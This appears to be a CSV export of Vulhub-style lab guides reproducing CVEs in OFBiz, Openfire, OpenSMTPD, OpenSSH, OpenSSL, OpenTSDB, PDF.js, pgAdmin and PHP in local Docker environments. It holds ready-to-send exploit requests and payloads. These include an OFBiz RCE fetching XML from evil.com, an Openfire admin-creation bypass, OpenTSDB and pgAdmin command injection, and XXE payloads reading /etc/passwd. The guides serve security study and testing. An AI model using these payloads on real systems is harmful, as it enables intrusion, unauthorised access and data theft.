Software,CVE,Title,Info,References
ofbiz,CVE-2024-45507,Apache OFBiz SSRF and Remote Code Execution (CVE-2024-45507),"Apache OFBiz SSRF and Remote Code Execution (CVE-2024-45507)

中文版本(Chinese version)

Apache OFBiz is an open source enterprise resource planning (ERP) system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise.

This vulnerability (CVE-2024-45507) affects Apache OFBiz versions prior to 18.12.16. It allows an unauthenticated attacker to perform Server-Side Request Forgery (SSRF) and potentially achieve remote code execution.

References:
<https://github.com/apache/ofbiz-framework/commit/ffb1bc4879
<https://xz.aliyun.com/t/15569
<https://paper.seebug.org/3228/

Vulnerable environment

Execute the following command to start an Apache OFBiz 18.12.15 server:


docker compose up -d


After a short wait, you can see the login page at https://localhost:8443/accounting.

Vulnerability Reproduce

Server-Side Request Forgery (SSRF) attack

Send a POST request to /webtools/control/forgotPassword/StatsSinceStart with the following request:


POST /webtools/control/forgotPassword/StatsSinceStart HTTP/1.1
Host: localhost:8443
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

statsDecoratorLocation=http://10.10.10.10/path/to/api


Remote Code Execution

Create a malicious XML file (payload.xml) on a public server like http://evil.com/ofbiz/payload.xml:

xml
<?xml version=""1.0"" encoding=""UTF-8""?
<screens xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
        xmlns=""http://ofbiz.apache.org/Widget-Screen"" xsi:schemaLocation=""http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd""

    <screen name=""StatsDecorator""
        <section
            <actions
                <set value=""${groovy:'touch /tmp/success'.execute();}""/
            </actions
        </section
    </screen
</screens


Then replace your malicious XML url into following request and send:


POST /webtools/control/forgotPassword/StatsSinceStart HTTP/1.1
Host: localhost:8443
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

statsDecoratorLocation=http://evil.com/ofbiz/payload.xml




The command touch /tmp/success will be executed on the target server, demonstrating successful exploitation.
-------------------------------------------------------------------------------","https://github.com/apache/ofbiz-framework/commit/ffb1bc4879
https://xz.aliyun.com/t/15569
https://paper.seebug.org/3228/
http://ofbiz.apache.org/dtds/widget-screen.xsd"">"
openfire,CVE-2023-32315,Openfire Admin Console Authentication Bypass (CVE-2023-32315),"Openfire Admin Console Authentication Bypass (CVE-2023-32315)

中文版本(Chinese version)

Openfire is a real time collaboration (RTC) server licensed under the Open Source Apache License. It uses the only widely adopted open protocol for instant messaging, XMPP (also called Jabber).

In the version prior to 4.7.4 and 4.6.7, Openfire's administrative console (the Admin Console), a web-based application, was found to be vulnerable to a path traversal attack via the setup environment. This permitted an unauthenticated user to use the unauthenticated Openfire Setup Environment in an already configured Openfire environment to access restricted pages in the Openfire Admin Console reserved for administrative users.

References:
<https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm
<https://mp.weixin.qq.com/s/EzfB8CM4y4aNtKFJqSOM1w

Vulnerable Environment

Execute following command to start a Openfire server 4.7.4:


docker compose up -d


After the server is started, open the link http://your-ip:9090 then you will be redirected to login page if you don't have the authentication.

Exploit

More than a decade ago, an path traversal issue was found in Openfire admin console, CVE-2008-6508. Attackers are able to use the /setup/setup-/../../[page].jsp to bypass the authentication checks and visit arbitratry page without knowning the admin username and password.

Since then the path traversal protections were already in place to protect against exactly this kind of attack.

A later upgrade of the embedded webserver included support for non-standard URL encoding of UTF-16 characters. The path traversal protections in place in Openfire were not updated to include protection against this new encoding. So attackers are able to use the /setup/setup-/%u002e%u002e/%u002e%u002e/[page].jsp to bypass the path traversal protection again.

To exploit this issue, the first step is to create a new administrator through following request:


GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=csrftoken&username=hackme&name=&email=&password=hackme&passwordConfirm=hackme&isadmin=on&create=Create+User HTTP/1.1
Host: localhost:9090
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: csrf=csrftoken




Although an exception is raised in response but an account with both username and password ""hackme"" is created.



Then log in to the admin console with this account, and you can see that hackme is already an administrator.
-------------------------------------------------------------------------------","https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm
https://mp.weixin.qq.com/s/EzfB8CM4y4aNtKFJqSOM1w"
opensmtpd,CVE-2020-7247,OpenSMTPD Remote Code Execution Vulnerability (CVE-2020-7247),"OpenSMTPD Remote Code Execution Vulnerability (CVE-2020-7247)

中文版本(Chinese version)

OpenSMTPD is an smtp service program for unix operating systems (BSD, MacOS, GNU/Linux), following the RFC 5321 SMTP protocol. OpenSMTPD was originally developed for the OpenBSD operating system and is part of the OpenBSD project. Due to its open source properties, Distributed to other unix platforms. According to the ISC license, the software is free for everyone to use and reuse.

CVE-2020-7247 is caused by OpenSMTPD's lax verification of the sender/recipient in the process of implementing RFC 5321.

On January 29, 2020, OpenSMTPD group officially submitted a fix for the CVE-2020-7247 in the GitHub repository. After the repair, the corresponding version is OpenSMTPD 6.6.2p1.

Reference：
https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt
https://www.exploit-db.com/exploits/47984
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247
https://www.anquanke.com/post/id/197689

Start Vulnerability Application

Start a vulnerable OpenSMTPD through following command:


docker compose up -d


After SMTPD server is started, connect to the 8825 port and get the result (44dadcc5a6eb is the container ID):


$ nc <your-ip8825 -v
220 44dadcc5a6eb ESMTP OpenSMTPD


Vulnerability Reproduce

Use Exploit-DB to gain a reverse shell:


python3 poc.py your-ip 8825 <command
-------------------------------------------------------------------------------","https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt
https://www.exploit-db.com/exploits/47984
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247
https://www.anquanke.com/post/id/197689"
openssh,CVE-2018-15473,OpenSSH Username Enumeration (CVE-2018-15473),"OpenSSH Username Enumeration (CVE-2018-15473)

中文版本(Chinese version)

OpenSSH is a suite of secure networking utilities based on the Secure Shell protocol, which provides a secure channel over an unsecured network in a client–server architecture.

CVE-2018-15473 is a medium-severity vulnerability affecting OpenSSH versions up to and including 7.7. This vulnerability allows user enumeration due to the system not delaying bailout for an invalid authenticating user until after the packet containing the request has been fully parsed. As a result, a remote attacker can test whether a certain user exists on a target OpenSSH server.

References:
http://openwall.com/lists/oss-security/2018/08/15/5
https://github.com/Rhynorater/CVE-2018-15473-Exploit
https://www.anquanke.com/post/id/157607

Vulnerable environment

Execute following commands to start a OpenSSH server 7.7p1:


docker compose build
docker compose up -d


After the server is started, you can log in to OpenSSH server by ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@your-ip -p20022 and password vulhub.

Vulnerability reproduce

Use CVE-2018-15473-Exploit to enumerate usernames in the dictionary:


python3 sshUsernameEnumExploit.py --port 20022 --userList exampleInput.txt your-ip




As you can see, root、example、vulhub、nobody are existing usernames, rootInvalid、user、phithon are non-existent usernames.
-------------------------------------------------------------------------------","http://openwall.com/lists/oss-security/2018/08/15/5
https://github.com/Rhynorater/CVE-2018-15473-Exploit
https://www.anquanke.com/post/id/157607"
openssl,CVE-2014-0160,OpenSSL Heartbleed Memory Leak Leads to Information Disclosure (CVE-2014-0160),"OpenSSL Heartbleed Memory Leak Leads to Information Disclosure (CVE-2014-0160)

中文版本(Chinese version)

The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet. SSL/TLS provides communication security and privacy over the Internet for applications such as web, email, instant messaging (IM) and some virtual private networks (VPNs).

The Heartbleed bug allows anyone on the Internet to read the memory of the systems protected by the vulnerable versions of the OpenSSL software. This compromises the secret keys used to identify the service providers and to encrypt the traffic, the names and passwords of the users and the actual content. This allows attackers to eavesdrop on communications, steal data directly from the services and users and to impersonate services and users.

References:
https://heartbleed.com/
https://filippo.io/Heartbleed

Setup

Execute following command to start a Nginx server with OpenSSL 1.0.1c:


docker compose up -d


After the server is started, browse the https://your-ip:8443 to see the welcome page.

We have encountered an error when running this environment where some AMD architecture CPUs were unable to access the https page successfully. If you have a similar problem, try an Intel CPU instead.

POC

Visit https://filippo.io/Heartbleed to check the result:



Run ssltest.py with Python to obtain sensitive data (such as Cookie):
-------------------------------------------------------------------------------","https://heartbleed.com/
https://filippo.io/Heartbleed"
openssl,CVE-2022-0778,OpenSSL Infinite Loop Leads to DoS (CVE-2022-0778),"OpenSSL Infinite Loop Leads to DoS (CVE-2022-0778)

中文版本(Chinese version)

OpenSSL is a software library for applications that secure communications over computer networks against eavesdropping or need to identify the party at the other end.

A flaw was found in OpenSSL. It is possible to trigger an infinite loop by crafting a certificate that has invalid elliptic curve parameters. Since certificate parsing happens before verification of the certificate signature, any process that parses an externally supplied certificate may be subject to a denial of service attack.

Reference links:
<https://github.com/drago-96/CVE-2022-0778
<https://www.cnblogs.com/logchen/p/16030515.html
<https://catbro666.github.io/posts/83951100/
<https://github.com/yywing/cve-2022-0778

Vulnerability environment

Execute following command to start a server:


docker compose up -d


Reproduce vulnerability

Firstly, use this project to build and run an evil server. If you don't have the Golang compiler, just use the Docker image:


docker run -it --rm -p 12345:12345 yywing/cve-2022-0778 --addr 0.0.0.0:12345


Then you can monitor the CPU usage inside the container through top:


docker compose exec curl top


This vulnerability is available when parsing the certificate, so we can use the cURL to demonstrate it.

Entry the environment, and use the cURL to browse the evil server that started before:


docker compose exec curl bash
curl -k https://host.docker.internal:12345


At this point, cURL will be caught in an infinite loop, and CPU resources will be exhausted unexpectedly:
-------------------------------------------------------------------------------","https://github.com/drago-96/CVE-2022-0778
https://www.cnblogs.com/logchen/p/16030515.html
https://catbro666.github.io/posts/83951100/
https://github.com/yywing/cve-2022-0778
https://host.docker.internal:12345"
openssl,Unknown,"This page moved to CVE-2014-0160
-------------------------------------------------------------------------------","This page moved to CVE-2014-0160
-------------------------------------------------------------------------------",
opentsdb,CVE-2023-25826,OpenTSDB Arbitrary Command Injection Remote Code Execution（CVE-2023-25826）,"OpenTSDB Arbitrary Command Injection Remote Code Execution（CVE-2023-25826）

中文版本(Chinese version)

OpenTSDB is a distributed, scalable Time Series Database (TSDB) written on top of HBase.
In version 2.4.1 and earlier, there is a command injection vulnerability. This vulnerability is actually due to an incomplete fix for CVE-2020-35476, so the entire reproduction process is similar to the previous one.

References:
https://www.synopsys.com/blogs/software-security/opentsdb/
https://github.com/OpenTSDB/opentsdb/pull/2275

Environment

Execute the following command to start a OpenTSDB server 2.4.1:


docker-compose up -d


Once the service is started, visit http://your-ip:4242 to see the web interface of the OpenTSDB.

Exploit

Simialar as CVE-2020-35476, you need to know the name of a metric, visit http://your-ip:4242/api/suggest?type=metrics&q=&max=10to find out the metric list.

Due to the tsd.core.autocreatemetrics is set to true in this vulnerable OpenTSDB, you can create a metric named sys.cpu.nice through following request, if the metrics are empty:


POST /api/put/ HTTP/1.1
Host: your-ip:4242
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 150

{
    ""metric"": ""sys.cpu.nice"",
    ""timestamp"": 1346846400,
    ""value"": 20,
    ""tags"": {
       ""host"": ""web01"",
       ""dc"": ""lga""
    }
}


If at least one metric exists and is not empty, the above request is not required.

Then the POC is different here, with the difference in the ""key"" parameter.


GET /q?start=2000/10/21-00:00:00&m=sum:sys.cpu.nice&o=&ylabel=1&xrange=&y2range=[42:42]&key=%3Bsystem%20%22touch%20/tmp/poc%22%20%22&wxh=1516x644&style=linespoint&baba=lala&grid=t&json HTTP/1.1
Host: your-ip:4242
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close






touch /tmp/poc has been successfully executed:
-------------------------------------------------------------------------------","https://www.synopsys.com/blogs/software-security/opentsdb/
https://github.com/OpenTSDB/opentsdb/pull/2275"
opentsdb,CVE-2020-35476,OpenTSDB Arbitrary Command Injection Remote Code Execution (CVE-2020-35476),"OpenTSDB Arbitrary Command Injection Remote Code Execution (CVE-2020-35476)

中文版本(Chinese version)

OpenTSDB is a distributed, scalable Time Series Database (TSDB) written on top of HBase.

A remote code execution vulnerability occurs in OpenTSDB through 2.4.0 via command injection in the yrange parameter. The yrange value is written to a gnuplot file in the /tmp directory. This file is then executed via the mygnuplot.sh shell script. (tsd/GraphHandler.java attempted to prevent command injections by blocking backticks but this is insufficient.)

References:
https://github.com/OpenTSDB/opentsdb/issues/2051
https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html

Vulnerable Environment

Execute the following command to start a OpenTSDB server 2.4.0:


docker compose up -d


Once the service is started, visit http://your-ip:4242 to see the web interface of the OpenTSDB.

Exploit

You need to know the name of a metric before you can exploit this vulnerability on http://your-ip:4242/api/suggest?type=metrics&q=&max=10:



However, the metrics list is empty.

Fortunately, the tsd.core.autocreatemetrics is set to true in this vulnerable OpenTSDB, so you can create a metric named sys.cpu.nice through following request:


POST /api/put/ HTTP/1.1
Host: your-ip:4242
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 150

{
    ""metric"": ""sys.cpu.nice"",
    ""timestamp"": 1346846400,
    ""value"": 20,
    ""tags"": {
       ""host"": ""web01"",
       ""dc"": ""lga""
    }
}


If at least one metric exists and is not empty, the above request is not required.

Send following request, where the value of the parameter m must contain a valid metric name:


GET /q?start=2000/10/21-00:00:00&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[0:system(%27touch%20/tmp/success%27)]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json HTTP/1.1
Host: your-ip:4242
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close






touch /tmp/success has been successfully executed.
-------------------------------------------------------------------------------","https://github.com/OpenTSDB/opentsdb/issues/2051
https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html"
pdfjs,CVE-2024-4367,PDF.js Arbitrary JavaScript Code Execution (CVE-2024-4367),"PDF.js Arbitrary JavaScript Code Execution (CVE-2024-4367)

中文版本(Chinese version)

PDF.js is a Portable Document Format (PDF) viewer that is built with HTML5.

In the PDF.js version prior to 4.1.392, a JavaScript code injection was found. This bug allows an attacker to execute arbitrary JavaScript code as soon as a malicious PDF file is opened.

References:
<https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/

Vulnerable environment

Execute following command to start a server that contains PDF.js 4.1.392:


docker compose up -d


After the server is started, browse http://your-ip:8080 you will see an uploading page.

Vulnerability reproduce

Upload malicious PDF file poc.pdf to trigger the XSS:
-------------------------------------------------------------------------------",https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/
pgadmin,CVE-2023-5002,pgAdmin <= 7.6 Authenticated Remote Command Execution (CVE-2023-5002),"pgAdmin <= 7.6 Authenticated Remote Command Execution (CVE-2023-5002)

中文版本(Chinese version)

pgAdmin is a popular and feature rich Open Source administration and development platform for PostgreSQL, the most advanced Open Source database in the world.

A flaw was found in pgAdmin. This issue occurs when the pgAdmin server HTTP API validates the path a user selects to external PostgreSQL utilities such as pgdump and pgrestore. Versions of pgAdmin prior to 7.7 failed to properly control the server code executed on this API, allowing an authenticated user to run arbitrary commands on the server.

References:
<https://github.com/pgadmin-org/pgadmin4/commit/35f05e49b3632a0a674b9b36535a7fe2d93dd0c2
<https://github.com/advisories/GHSA-ghp8-52vx-77j4

Vulnerable Environment

Execute following command to start a pgAdmin 7.6 server:


docker compose up -d


After the server is started, browse the http://your-ip:5050 to see the default login page of pgAdmin.

Something we should know before exploiting the issue

CVE-2023-5002 is a pathes bypass for previous issue CVE-2022-4223. There are 2 updates from official patches:
Added @loginrequired to validatebinary_path function, not allowed unauthenticated user to access this API
Added os.path.exists() to check if the user provided parameter is a valid path

Unfortunately, we can only bypass the second patch, so the CVE-2023-5002 is a authenticated vulerability.

Exploit

Login the pgAdmin by username vulhub@example.com and password vulhub.

Select ""Tools -Storage Manager"" to open the filemanager dialog:



Create a new folder which name is a crafted payload "";id;#:



Full path of this folder is /var/lib/pgadmin/storage/vulhub_example.com/"";id;#, we will use this path to complete the exploitation.

Go to ""File -Preferences"" to open the setting dialog, open the ""Paths -Binary paths"" panel.

Fill the /var/lib/pgadmin/storage/vulhub_example.com/"";id;# into any field of ""PostgreSQL Binary Path"" then click validate:



As you can see, the id command is executed successful:
-------------------------------------------------------------------------------","https://github.com/pgadmin-org/pgadmin4/commit/35f05e49b3632a0a674b9b36535a7fe2d93dd0c2
https://github.com/advisories/GHSA-ghp8-52vx-77j4"
pgadmin,CVE-2022-4223,pgAdmin <= 6.16 Unauthenticated Remote Command Execution (CVE-2022-4223),"pgAdmin <= 6.16 Unauthenticated Remote Command Execution (CVE-2022-4223)

中文版本(Chinese version)

pgAdmin is a popular and feature rich Open Source administration and development platform for PostgreSQL, the most advanced Open Source database in the world.

The pgAdmin server includes an HTTP API that is intended to be used to validate the path a user selects to external PostgreSQL utilities such as pgdump and pgrestore. The utility is executed by the server to determine what PostgreSQL version it is from. Versions of pgAdmin prior to 6.17 failed to properly secure this API, which could allow an unauthenticated user to execute arbitrary commands on the server.

References:
<https://github.com/pgadmin-org/pgadmin4/commit/799b6d8f7c10e920c9e67c2c18d381d6320ca604
<https://github.com/pgadmin-org/pgadmin4/commit/461849c2763e680ed2296bb8a753ca7aef546595
<https://github.com/advisories/GHSA-3v6v-2x6p-32mc

Vulnerable Environment

Execute following command to start a pgAdmin 6.16 server:


docker compose up -d


After the server is started, browse the http://your-ip:5050 to see the default login page of pgAdmin.

Exploit

Before exploiting the vulnerability, send the following request to obtain the CSRF token:


GET /login HTTP/1.1
Host: your-ip:5050
Accept: application/json, text/plain, /
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7
Connection: close




Get the session id and csrf token from response:



Then, fill the following request with the session id and csrf token and send it:


POST /misc/validatebinarypath HTTP/1.1
Host: your-ip:5050
Content-Length: 27
X-pgA-CSRFToken: [csrf-token]
Accept: application/json, text/plain, /
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7
Cookie: pga4_session=[session-id]
Connection: close

{""utility_path"":""a\"";id;#""}


As you can see, id command has been executed successful:
-------------------------------------------------------------------------------","https://github.com/pgadmin-org/pgadmin4/commit/799b6d8f7c10e920c9e67c2c18d381d6320ca604
https://github.com/pgadmin-org/pgadmin4/commit/461849c2763e680ed2296bb8a753ca7aef546595
https://github.com/advisories/GHSA-3v6v-2x6p-32mc"
php,Unknown,PHP XDebug Remote Debugging Code Execution,"PHP XDebug Remote Debugging Code Execution

中文版本(Chinese version)

XDebug is a PHP extension used for debugging PHP code. When remote debugging mode is enabled with appropriate settings, an attacker can execute arbitrary PHP code on the target server by exploiting the debug protocol (DBGp).

For XDebug version 2.x, the vulnerability occurs when the following configuration is enabled:

ini
xdebug.remoteconnectback = 1
xdebug.remote_enable = 1


For XDebug version 3.x (which introduced breaking changes in configuration), the equivalent vulnerable configuration is:

ini
xdebug.mode = debug
xdebug.discoverclienthost = 1
xdebug.client_host = 1


When these configurations are enabled, XDebug will attempt to connect back to the attacker's IP through the DBGp protocol when a client visits the appropriate trigger URL. The DBGp protocol provides an eval function that can be used to execute arbitrary PHP code.

References:
<https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface
<https://xdebug.org

Environment Setup

Execute the following command to build and start the vulnerable environment:


docker compose up -d


The environment includes two services:
PHP 7.1 with XDebug 2.5.5: Accessible at http://your-ip:8080/
PHP 7.4 with XDebug 3.1.6: Accessible at http://your-ip:8081/

After the environment is started, visit each URL to see a simple phpinfo page. You can verify that XDebug is enabled and configured for remote debugging in the PHP configuration section.

Vulnerability Reproduction

Since the vulnerability requires communication using the DBGp protocol with the target server, it cannot be reproduced using HTTP protocol alone.

A proof-of-concept exploit script exp.py is provided that can execute arbitrary PHP code on the target server. The script supports both XDebug 2.x (port 9000) and XDebug 3.x (port 9003):

bash
Requires Python 3 and the requests library
python3 exp.py -t http://[target-ip]:8080/index.php -c 'shell_exec(""id"");' --dbgp-ip [attacker-ip]
python3 exp.py -t http://[target-ip]:8081/index.php -c 'shell_exec(""id"");' --dbgp-ip [attacker-ip]


Successful exploitation will execute the command and return its output:



Important Notes

The exploitation process involves a reverse connection:

1. The exploit script listens on port 9000 (XDebug 2.x) and port 9003 (XDebug 3.x), please make sure these ports are not blocked by the firewall
2. You have to have a public IP address or be in the same network as the target
3. If your public IP differs from your local machine, use the --dbgp-ip parameter to specify the IP address that the target server can reach
-------------------------------------------------------------------------------","https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface
https://xdebug.org
http://[target-ip]:8080/index.php
http://[target-ip]:8081/index.php"
php,Unknown,PHP XML External Entity Injection (XXE),"PHP XML External Entity Injection (XXE)

中文版本(Chinese version)

XML External Entity (XXE) Injection is a vulnerability that occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This vulnerability can lead to various attacks including disclosure of confidential data, denial of service, server side request forgery, port scanning, and other system impacts.

After libxml 2.9.0, external entity parsing is disabled by default, which largely mitigated XXE vulnerabilities. This environment uses libxml 2.8.0 compiled into PHP to demonstrate XXE vulnerabilities in PHP applications.

References:
OWASP XXE Prevention Cheat SheetProcessing)
PHP Documentation: libxml
CWE-611: Improper Restriction of XML External Entity Reference

Environment Setup

This environment is based on the PHP 7.0.30 with libxml 2.8.0, execute the following command to start the environment:


docker compose up -d


After the server starts, visit http://your-ip:8080/index.php to see the phpinfo page. You can verify the libxml version (2.8.0) by searching for ""libxml"" on that page.

The web root directory ./www contains three vulnerable PHP files demonstrating different XML parsing methods:

bash
$ tree .
.
├── dom.php               # Example: XML parsing using DOMDocument
├── index.php
├── SimpleXMLElement.php  # Example: XML parsing using SimpleXMLElement class
└── simplexmlloadstring.php  # Example: XML parsing using simplexmlloadstring function


All three files (dom.php, SimpleXMLElement.php, and simplexmlloadstring.php) are vulnerable to XXE attacks.

Vulnerability Reproduction

Send the following XML payload to any of the vulnerable files to read the contents of /etc/passwd:

xml
<?xml version=""1.0"" encoding=""utf-8""?
<!DOCTYPE xxe [
<!ELEMENT name ANY 
<!ENTITY xxe SYSTEM ""file:///etc/passwd"" ]
<root
<name&xxe;</name
</root


The successful exploitation will display the contents of the file:



Advanced Exploitation Techniques

Reading Arbitrary Files:

xml
<!ENTITY xxe SYSTEM ""file:///path/to/sensitive/file"" 


SSRF (Server-Side Request Forgery):

xml
<!ENTITY xxe SYSTEM ""http://internal.service.local"" 


Denial of Service (Billion Laughs Attack):

xml
<!ENTITY lol ""lol""
<!ENTITY lol2 ""&lol;&lol;""
<!ENTITY lol3 ""&lol2;&lol2;""
-------------------------------------------------------------------------------",
php,Unknown,PHP-FPM FastCGI Unauthorized Access Leads to Remote Code Execution,"PHP-FPM FastCGI Unauthorized Access Leads to Remote Code Execution

中文版本(Chinese version)

PHP-FPM (FastCGI Process Manager) is an alternative PHP FastCGI implementation with some additional features useful for sites of any size, especially busier sites. When misconfigured, PHP-FPM can be accessed directly through the FastCGI protocol, allowing attackers to execute arbitrary PHP code.

This vulnerability occurs when PHP-FPM is exposed to the network without proper access controls, allowing unauthorized access to the FastCGI interface.

References:
<https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html
<https://www.php.net/manual/en/install.fpm.php

Environment Setup

Execute the following command to start the vulnerable PHP-FPM server:

bash
docker compose up -d


After the server starts, the PHP-FPM server will listen on port 9000.

Vulnerability Reproduction

A proof-of-concept exploit script is available at: https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75

The script allows you to:

1. Connect directly to the PHP-FPM port
2. Send crafted FastCGI requests
3. Execute arbitrary PHP code on the target server

Successful exploitation result:
-------------------------------------------------------------------------------","https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html
https://www.php.net/manual/en/install.fpm.php
https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75"
